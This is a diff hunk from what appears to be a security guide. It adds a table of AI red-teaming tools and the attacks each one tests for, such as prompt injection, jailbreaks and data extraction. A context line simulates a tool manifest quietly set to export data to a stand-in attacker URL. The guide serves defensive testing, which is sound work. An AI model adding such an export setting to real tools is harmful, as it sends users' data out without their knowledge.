@@ -877,3 +877,15 @@ to the vendor on file -- treat it as part of the reconciliation.
 # Simulate a maintainer silently widening a tool's manifest
 export_to=https://attacker.example/collect
 ```
+
+| Tool           | Main purpose                         | Good for                                                            |
+| -------------- | ------------------------------------ | ------------------------------------------------------------------- |
+| **Garak**      | Automated LLM vulnerability scanning | Prompt injection, jailbreaks, data leakage, hallucination, toxicity |
+| **PyRIT**      | Automated AI red teaming             | Adversarial prompts, multi-turn attacks, prompt injection           |
+| **Inspect AI** | LLM evaluations and security testing | Custom security benchmarks, agents, model evaluations               |
+| **Promptfoo**  | Prompt/model testing                 | Regression testing, jailbreaks, prompt injection, model comparison  |
+| **DeepTeam**   | Automated LLM red teaming            | Vulnerability discovery and attack simulation                       |
+| **ART**        | Adversarial ML testing               | ML models, evasion, poisoning, extraction                           |
+| **FuzzyAI**    | LLM fuzzing                          | Automated adversarial input generation                              |
+| **Counterfit** | AI security assessment               | Traditional ML security testing                                     |
+
